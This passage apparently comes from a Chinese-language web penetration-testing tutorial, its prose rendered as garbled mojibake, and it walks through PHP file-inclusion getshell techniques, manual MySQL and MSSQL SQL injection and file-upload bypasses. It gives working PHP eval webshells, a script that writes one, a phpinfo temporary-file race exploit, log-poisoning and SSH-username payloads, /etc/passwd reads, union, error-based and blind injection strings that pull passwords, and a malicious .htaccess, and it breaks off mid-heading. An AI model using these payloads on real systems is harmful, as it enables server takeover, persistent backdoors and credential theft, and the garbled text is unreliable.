éœ€è¦æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œå¹¶ä¸”èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå›¾ç‰‡é©¬çš„å†…å®¹å¦‚ä¸‹ï¼š

```
<?php fputs(fopen("panda.php","w"),'<? @eval($_POST[PANDA]);?>');?>
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibuHDML0ia1F3icQbDxYftBnOmBIlWbdia1wLAYmp0EPB3rJ0QpxbBjpSAg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆpanda.phpï¼Œå¯†ç ä¸ºPANDAï¼Œè¿æ¥å³å¯

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibSrDjjOeamDLqUbUq3ILhroYhea8ME4qMLdnb5wMHECNVRdbqqLMsibw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



 

**â‘¢åŒ…å«ä¸´æ—¶æ–‡ä»¶+phpinfo getshell**

åœ¨PHPæ–‡ä»¶åŒ…å«æ¼æ´ä¸­ï¼Œå½“æˆ‘ä»¬æ‰¾ä¸åˆ°ç”¨äºè§¦å‘RCEçš„æœ‰æ•ˆæ–‡ä»¶æ—¶ï¼Œå¦‚æœå­˜åœ¨PHPINFOï¼ˆå®ƒå¯ä»¥å‘Šè¯‰æˆ‘ä»¬ä¸´æ—¶æ–‡ä»¶çš„éšæœºç”Ÿæˆçš„æ–‡ä»¶ååŠå…¶ä½ç½®ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½å¯ä»¥åŒ…å«ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶æ¥åˆ©ç”¨å®ƒå‡çº§ä¸ºRCEã€‚

 

**åˆ©ç”¨æ–¹æ³•ç®€è¿°ï¼š**

åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨$_FILESå˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚

åŒæ—¶ï¼Œå› ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°$_FILESå˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚

åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹ã€‚

ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚

 

**è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š**

1ã€å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ®

2ã€å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§

3ã€phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥

4ã€æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…

5ã€æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤

6ã€åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell

 

**æ“ä½œè¿‡ç¨‹ï¼š**

**è®¿é—®å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢**

```
http://192.168.136.128:8080/lfi.php?file=/etc/passwd
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibq7iathIdDFVib8elfl2ojziaJqQs9WJ5vA77ZFYwTeRG8icHoibWJjTEK4A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

è®¿é—®phpinfoé¡µé¢ï¼Œéœ€è¦ç¡®å®å­˜åœ¨

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibCytdyZHhE2TEKyN2yOGXFoBMbsfiajj9tyUFH1LWyXXdOuAQqqZDqag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

ç„¶ååˆ©ç”¨expè¿›è¡Œåˆ©ç”¨ï¼š

- 

```
python2 exp.py ç›®æ ‡ip 8080 100
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibWsQwkcBmrnWQFvepzByhAaT1HLzpu7fe9EFYqRywibrwFajA7oBFqiag/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

åœ¨189æ¬¡è¯·æ±‚æ—¶ï¼Œå°±å†™å…¥æˆåŠŸäº†



è„šæœ¬exp.pyå®ç°äº†ä¸Šè¿°æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œä¼šåˆ©ç”¨file_put_contentså‡½æ•°å†™å…¥<?=eval($_REQUEST[1])?>ä¸€å¥è¯åé—¨åˆ°/tmp/gæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šæ°¸ä¹…ç•™åœ¨ç›®æ ‡æœºå™¨ä¸Š

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibPztrWuAFn0QTx0XIEjFNEZf7ibTd82EiaFxicHGhPQ7uWlXfiaYrKdZfbg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



ç„¶åç›´æ¥åˆ©ç”¨èšå‰‘è¿›è¡Œè¿æ¥å³å¯ï¼Œå¯†ç ä¸º1ï¼š

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibI5PuvsGpfI0gWTzRHEwoicoU3McPG9cKfjGWic7Yv11Marjjkc6QyUWw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

 

 

**â‘£åŒ…å«sessionæ–‡ä»¶getshell**

sessionç®€ä»‹ï¼šcookieå­˜åœ¨å®¢æˆ·ç«¯ï¼Œsessionå­˜åœ¨æœåŠ¡ç«¯ï¼Œcookieä¸€èˆ¬ç”¨æ¥ä¿å­˜ç”¨æˆ·å¾—è´¦æˆ·å¯†ç ï¼Œsessionä¸€èˆ¬ç”¨æ¥è·Ÿè¸ªä¼šè¯ã€‚

**åˆ©ç”¨åœºæ™¯ï¼š**

ä¸€èˆ¬å¯¹äºç™»é™†ç‚¹å­˜åœ¨æ³¨å†Œç”¨æˆ·çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥èµ·ä¸€ä¸ªä¸ºpayloadçš„åå­—ï¼Œè¿™æ ·ä¼šå°†payloadä¿å­˜åœ¨sessionæ–‡ä»¶ä¸­

åˆ©ç”¨æ¡ä»¶ï¼š

**â‘ sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥**

sessionæ–‡ä»¶è·¯å¾„ä½ç½®å¯ä»¥é€šè¿‡phpinfoé¡µé¢æ¥è·å–ï¼šsession.save_pathå‚æ•°

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibbDFhfduBoIT0x0RwbfJ8hp2LTu22NLJLXytRexYHN1PW53P0GctI3Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

ä¹Ÿå¯ä»¥çŒœæµ‹å¸¸è§çš„ä¸€äº›sessionå­˜å‚¨ä½ç½®ï¼š

- 
- 

```
/var/lib/php/sess_[PHPSESSID]/tmp/sess_[PHPSESSID]
```

**â‘¡ä¸”å…¶ä¸­éƒ¨åˆ†å†…å®¹å¯æ§åˆ¶**

 

**åˆ©ç”¨æ–¹å¼ï¼š**

è®¿é—®æ¼æ´é¡µé¢ï¼Œåœ¨å‚æ•°ä¸­æ„é€ payload

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibhoaENlk0KrwhwvaG7cTLt1dJVdn1VNeaxicxXFNfKBW9zGO1yKtmdpQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

ç„¶åæˆ‘ä»¬çš„é¦–è¦ä»»åŠ¡å°±æ˜¯è·å–sessionæ–‡ä»¶åï¼Œå¯é€šè¿‡è°·æ­Œæµè§ˆå™¨ï¼Œæˆ–è€…burpæŠ“åŒ…æŸ¥çœ‹

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibWMmvPROVlpTfvta9CRIagezTqpGfsp1lquleeQDWYTAbBpTn4Q8Ctw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

æ–‡ä»¶åï¼šsess_hvjhivr3iptal3909f90rksu9pï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è·¨ç›®å½•åŒ…å«sessionæ–‡ä»¶getshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibkoKlMTR07PtF77W9kjiaQSqJDbknO7A22JdFC2ibZHxLhUWvEYKJh7IA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



è¿æ¥webshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMNiavmdeC22KwC6ZR4kdRndn3dIngpbr6xj45nh541OsLxMiaXy56mSA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

**â‘¤åŒ…å«æ—¥å¿—æ–‡ä»¶getshell**

**1.åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶**

åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.log(ä¼šè®°å½•è®¿é—®IPã€è®¿é—®é“¾æ¥ã€Refererå’ŒUser-Agentç­‰)ï¼Œå½“è¯·æ±‚é”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.log

**åˆ©ç”¨æ¡ä»¶ï¼š**æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œå¹¶ä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚

**â‘ apacheçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥é€šè¿‡phpinfoé¡µé¢æ¥æŸ¥è¯¢ï¼Œapache2handler ä¸­çš„server rootå°±æ˜¯apacheçš„å®‰è£…è·¯å¾„ï¼Œé‚£ä¹ˆæ—¥å¿—æ–‡ä»¶åº”è¯¥å°±æ˜¯åœ¨è¿™ä¸ªè·¯å¾„ä¸‹çš„logsç›®å½•ä¸­**

**â‘¡æˆ–è€…é€šè¿‡çŒœæµ‹å¸¸è§æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„/usr/local/apache/logs/error_logæˆ–è€…access_log**

**â‘¢ä¹Ÿå¯ç”¨é€šè¿‡å…ˆåŒ…å«é…ç½®æ–‡ä»¶æ¥ç¡®å®šæ—¥å¿—æ–‡ä»¶è·¯å¾„**

- 
- 

```
index.php?page=/etc/init.d/httpdindex.php?page=/etc/httpd/conf/httpd.conf
```

 

**åˆ©ç”¨æ–¹å¼ï¼š**

å› ä¸ºä¼šè‡ªåŠ¨urlç¼–ç ï¼Œä¼šå¯¼è‡´æ— æ³•åˆ©ç”¨ï¼Œæ‰€ä»¥æŠ“åŒ…å†è¯·æ±‚

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibILg71QSriaVicBkWxaev9IpmrlzRyKP0Tz1yToSPDU7WGewq3ib3cYvIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



å¯ä»¥çœ‹åˆ°error.logæ–‡ä»¶ä¸­å·²ç»æˆåŠŸå†™å…¥äº†payload

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMkPvIM4j8CsHdWHV7kYSFSXNVbymciaPHKVqibZiaqPicUFhRThfIqybEg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



ç„¶ååŒ…å«logæ–‡ä»¶è·¯å¾„å³å¯

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbib3wPM0ibYiaEx35XrvDlXjbG6rnJKOFeeutXBoapvSFNydYkwnaSAAAvA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



è¿æ¥webshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibMNiavmdeC22KwC6ZR4kdRndn3dIngpbr6xj45nh541OsLxMiaXy56mSA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**2.åŒ…å«SSHæ—¥å¿—æ–‡ä»¶**

- 

```
ssh '<?php phpinfo();?>'@192.168.136.143
```

è¿™æ ·æŠŠç”¨æˆ·åå†™æˆphpinfoï¼Œsshçš„ç™»é™†æ—¥å¿—å°±ä¼šæŠŠæ­¤æ¬¡çš„ç™»é™†è¡Œä¸ºè®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œåˆ©ç”¨åŒ…å«æ¼æ´getshell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibLEl6dAVGe8c6AfyrnevYGZVKkQO8h0H6syPzNG7KMauQrgmRyyTtzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç™»é™†çš„è¡Œä¸ºéƒ½è¢«è®°å½•åˆ°äº†æ—¥å¿—å½“ä¸­

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIOibBzIOLll8ooQ5sWeF2fSQ7rtnP6APU09wPibUht1o3ia6E9Peyt6NQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



å¯ä»¥çœ‹åˆ°åˆšæ‰ç™»é™†çš„æ—¶å€™ï¼ŒæˆåŠŸphpinfoå†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­å¹¶ä¸”æˆåŠŸè§£æ

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibxS7Brrqa6zc0M4T5jmzq1vEG2Fsiaq2huYwD3QVhD9zWku3rHCSCYcQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 



é€šè¿‡phpinfoæŸ¥çœ‹åˆ°äº†ç½‘ç«™æ ¹ç›®å½•

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibQRHNccvl4ODY5iaDEUic4lpyicY7RiaqWycEtEMPYv1NJuoSSBwlOh8Ocw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

æœ¬æ¥æƒ³ç€åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´é…åˆfputså’Œfopenå‡½æ•°åœ¨ç½‘ç«™æ ¹ç›®å½•å†™å…¥ä¸€å¥è¯æœ¨é©¬getshellï¼Œä½†æ˜¯ç”±äºå•å¼•å·å¤ªå¤šå°±æŠ¥é”™äº†ï¼Œåªèƒ½å¦è°‹å‡ºè·¯

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIsYlBtsR4lng0YiaeIXYV1z139YrLPsbRs7STvVf25KhuhDWFxAV54Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



ç„¶åå°±æƒ³åˆ°äº†æŠŠæ‰§è¡Œå‘½ä»¤çš„ä¸€å¥è¯æœ¨é©¬å†™å…¥æ—¥å¿—ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œåå¼¹shell

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibuKZsD9bvlceKys2xVDMmEibfzvuicgMEBc0R8bbX9pDu00ia6YsHaUcgA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



ç„¶åæ„é€ è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºåˆšæ‰æˆ‘å†™è¿›å»çš„æ˜¯é€šè¿‡GETæ–¹å¼ç”¨pandaå‚æ•°ä¼ å‚ï¼Œå¤šä¸ªå‚æ•°ä¹‹é—´ç”¨&ç¬¦å·è¿æ¥ï¼Œè¿˜æ˜¯è¦æ³¨æ„ï¼Œå‘½ä»¤è¦urlç¼–ç å†æ‰§è¡Œ

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibPsafM6CeRIB6Aja4KKcXibgwQZtpooic4hQp9UBszS3CiaGfGmPgTV3hA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)







## sqlæ³¨å…¥æ¼æ´



æ‰‹æ³¨

https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/



æŸ¥è¯¢ç”¨ http://sqlwiki.radare.cn/



**mysqlæ•°å­—å‹æ‰‹æ³¨**

å­—ç¬¦å‹å’Œæ•°å­—çš„æ³¨å…¥åŸºæœ¬ä¸€æ ·(ä¸‹é¢ç›´æ¥æ¼”ç¤ºæ•°å­—å‹),åªæ˜¯å­—ç¬¦çš„éœ€è¦é—­åˆå‰é¢çš„ä¸€æ¡sql

å¸¸è§çš„é—­åˆå°±æ˜¯

```
'

"

')

'')
```

æœ‰æ—¶è¿˜éœ€è¦æ³¨é‡Šåé¢çš„ä¸€äº›sql

å¯ä»¥ä½¿ç”¨

```
--+

# åœ¨urlé‡Œé¢éœ€è¦ç¼–ç ä¸º %23
```



```
åˆ¤æ–­å­—æ®µ
?id=1 and 1=1 order by 1 

å›æ˜¾ç‚¹åˆ¤æ–­

?id=1 and 1=2 union select 1,2 

å½“å‰åº“

?id=1 and 1=2 union select 1,database() 
å½“å‰ç”¨æˆ·

?id=1 and 1=2 union select 1,user() 

å½“å‰ç‰ˆæœ¬

 ?id=1 and 1=2 union select 1,version()

çˆ†è¡¨

?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1

å½“å‰è¡¨å­—æ®µå

ç”¨limitè¿›è¡ŒæŸ¥è¯¢

 ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 

è·å–æ•°æ®

?id=1 and 1=2 union select 1,password from admin  limit 0,1
```





mysqlæŠ¥é”™æ³¨å…¥

åœ¨ä¸èƒ½è”åˆæ³¨å…¥çš„æ—¶å€™å°±éœ€è¦ç”¨åˆ°å®ƒ

(æœ‰åç§æŠ¥é”™å‡½æ•°,https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

```
çˆ†åº“ï¼š

http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +

çˆ†è¡¨ï¼š

http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +

çˆ†å­—æ®µï¼š

http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +

çˆ†æ•°æ®ï¼š

http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +
```



mysqlç›²æ³¨

1. æ—¶é—´ç›²æ³¨
2. å¸ƒå°”ç›²æ³¨

å¯ä»¥ç”¨äºŒåˆ†ï¼Œdnslog,ç­‰ç­‰å¯ä»¥åŠ å¿«æ³¨å…¥

å·¥å…·

https://github.com/ADOOO/DnslogSqlinj



æ—¶é—´ç›²æ³¨ä¹Ÿå«å»¶æ—¶æ³¨å…¥ ä¸€èˆ¬ç”¨åˆ°å‡½æ•° `sleep()` `BENCHMARK()`

ä¸€èˆ¬æ—¶é—´ç›²æ³¨æˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨æ¡ä»¶åˆ¤æ–­å‡½æ•°

`ifï¼ˆexpre1ï¼Œexpre2ï¼Œexpre3ï¼‰` å½“expre1ä¸ºtrueæ—¶ï¼Œè¿”å›expre2ï¼Œfalseæ—¶ï¼Œè¿”å›expre3 ç›²æ³¨çš„åŒæ—¶ä¹Ÿé…åˆç€mysqlæä¾›çš„åˆ†å‰²å‡½ï¼Œä¸æ­£åˆ™å‡½æ•° likeå‡½æ•°ï¼Œæ¯”è¾ƒå‡½æ•°ç­‰ç­‰

```
select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);
```

ä»¬ä¸€èˆ¬å–œæ¬¢æŠŠåˆ†å‰²çš„å‡½æ•°ç¼–ç ä¸€ä¸‹ï¼Œå½“ç„¶ä¸ç¼–ç ä¹Ÿè¡Œï¼Œç¼–ç çš„å¥½å¤„å°±æ˜¯å¯ä»¥ä¸ç”¨å¼•å· å¸¸ç”¨åˆ°çš„å°±æœ‰ `ascii()` `hex()` ç­‰ç­‰ `benchmark()`å…¶ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ã€‚benchmark()ä¸­å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…æ˜¯è¡¨è¾¾å¼ã€‚

```
 select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);
```



ç›²æ³¨æ€è·¯çš„æ€è·¯å¾ˆå¤š æ¯”å¦‚æ­£åˆ™åŒ¹é…,æ¯”è¾ƒå‡½æ•°,è¿ç®—ç¬¦ï¼Œæ¨èå¤§å®¶å¯ä»¥çœ‹çœ‹ https://www.anquanke.com/post/id/170626

ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡å‡½æ•°çœ‹è¿”å›trueè¿˜æ˜¯false

1.ç›´æ¥é€šè¿‡å­—ç¬¦ä¸²æˆªå–å¯¹æ¯”ï¼Œç±»ä¼¼å‡½æ•°å¾ˆå¤šåé¢åšä¸ªæ€»ç»“å§

```
http://127.0.0.1/sqli/Less-1/?id=1' and substr((select user()),1,1)='r' -- +
```



2.ç”¨ `IFNULL()` å‡½æ•°

```
http://127.0.0.1/sqli/Less-1/?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +
```

3.ä½¿ç”¨ æ¯”è¾ƒå‡½æ•°`strcmp()`

```
1.

http://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +
http://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),0) -- +


2.

mysql> select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),'o');
Empty set (0.00 sec)

mysql> select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),'o');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
```





**mssqlæ‰‹æ³¨**

å‚è€ƒhttps://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI

æŸ¥è¯¢åŸºæœ¬ä¿¡æ¯

```
and @@version>~1

and (user|1)>-1

and (db_name()|1)>.1
```

åˆ¤æ–­å½“å‰è¡¨åå’Œåˆ—å ä¹Ÿå¯ä»¥ä½¿ç”¨ `having 1=1` å’Œ `group by`

```
http://192.168.130.137/1.aspx?id=1 having 1=1
```
**çˆ†å‡ºå½“å‰è¡¨å’Œå­—æ®µ**

[![mysql](img/1.4.6.png)](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/img/1.4.6.png)





**çˆ†å‡ºæ‰€æœ‰çš„å­—æ®µ**

```
http://192.168.130.137/1.aspx?id=1 group by info.id,info.name having 1=1
```

[![mysql](img/1.4.7.png)](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/img/1.4.7.png)







## æ–‡ä»¶ä¸Šä¼ æ¼æ´



![image-20201125140003211](img/image-20201125140003211.png)



ç»ƒä¹ ç¯å¢ƒï¼šhttps://github.com/c0ny1/upload-labs

å‚è€ƒæ–‡ç« :

https://www.jianshu.com/p/74ca4e884645 (ä¸Šä¼ æ€»ç»“)

https://www.jianshu.com/p/1ccbab572974 (è§£ææ€»ç»“)

**ç‰¹æ®Šåç¼€ç»•è¿‡é»‘åå•**

apache

> phpã€php3ã€php4ã€php5ã€phptã€phtml

iis

> asaã€cerã€cdx



**ä¸Šä¼ .htaccessæ–‡ä»¶**

æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š

```xml
#æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè§£ææˆphp
SetHandler application/x-httpd-php

# è§£ææŒ‡å®šjpg
 <FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
  </FilesMatch>
# è§£æxxåç¼€
 AddType application/x-httpd-php xxx

```



**NTFSæµå†’å·æˆªæ–­**

